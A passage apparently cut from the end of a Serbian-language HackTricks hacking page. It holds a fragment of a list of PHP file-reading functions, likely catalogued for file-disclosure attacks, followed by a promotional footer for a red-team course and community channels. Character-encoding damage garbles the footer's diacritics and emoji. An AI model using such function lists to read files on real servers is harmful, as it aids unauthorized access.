sha1_file
-- highlight_file
-- show_source
php_strip_whitespace
get_meta_tags
```
<details>

<summary><strong>Nau캜ite hakovanje AWS-a od nule do heroja sa</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Drugi na캜ini podr코ke HackTricks-u:

* Ako 쬰lite da vidite svoju **kompaniju reklamiranu na HackTricks-u** ili da **preuzmete HackTricks u PDF formatu** proverite [**PLANOVE ZA PRIJATELJSTVO**](https://github.com/sponsors/carlospolop)!
* Nabavite [**zvani캜ni PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Otkrijte [**Porodicu PEASS**](https://opensea.io/collection/the-peass-family), na코u kolekciju ekskluzivnih [**NFT-ova**](https://opensea.io/collection/the-peass-family)
* **Pridru쬴te se** 游눫 [**Discord grupi**](https://discord.gg/hRep4RUj7f) ili [**telegram grupi**](https://t.me/peass) ili nas **pratite** na **Twitteru** 游냕 [**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Podelite svoje hakovanje trikove slanjem PR-ova na** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repozitorijume.

</details>
